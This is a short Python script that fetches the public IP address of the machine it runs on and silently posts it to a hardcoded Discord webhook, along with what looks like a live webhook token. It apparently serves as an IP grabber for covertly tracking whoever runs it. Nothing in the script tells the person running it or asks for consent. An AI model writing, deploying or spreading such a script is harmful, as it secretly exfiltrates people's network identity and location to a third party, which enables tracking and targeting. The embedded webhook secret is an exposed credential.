import requests

WEBHOOK_URL = "https://discord.com/api/webhooks/1444092786210111632/x8hPF9-vXrKOy_3QJwZKDFvRCsm_7PzVuH69t_rqczttGBoWIXhlexfu9fvxMbrUeijn"

def get_ip():
    try:
        response = requests.get("https://api.ipify.org?format=text", timeout=5)
        response.raise_for_status()
        return response.text.strip()
    except Exception:
        return None

def send_to_webhook(ip):
    data = {"content": f"User's public IP address: {ip}"}
    try:
        res = requests.post(WEBHOOK_URL, json=data, timeout=5)
        return res.status_code
    except Exception:
        return None

def main():
    ip = get_ip()
    if ip:
        send_to_webhook(ip)

if __name__ == "__main__":
    main()
